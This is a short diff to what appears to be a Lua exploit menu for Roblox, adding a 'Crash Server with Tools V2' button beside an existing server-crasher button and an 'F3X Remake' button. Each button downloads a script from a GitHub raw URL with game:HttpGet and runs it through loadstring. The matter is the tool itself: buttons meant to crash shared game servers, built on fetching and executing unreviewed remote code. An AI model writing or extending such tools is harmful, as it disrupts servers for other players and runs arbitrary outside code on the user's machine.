@@ -381,6 +381,10 @@ miscSec:Button("Crash Server with Tools", function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/ALLAHSIZV0C0N456793/Hj/refs/heads/main/fe%20tool%20server%20crasher%20.txt"))()
 end)
 
+miscSec:Button("Crash Server with Tools V2", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/scripts/crash-with-tools-v2.lua"))()
+end)
+
 miscSec:Button("F3X Remake", function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/scripts/f3xr.lua"))()
 end)
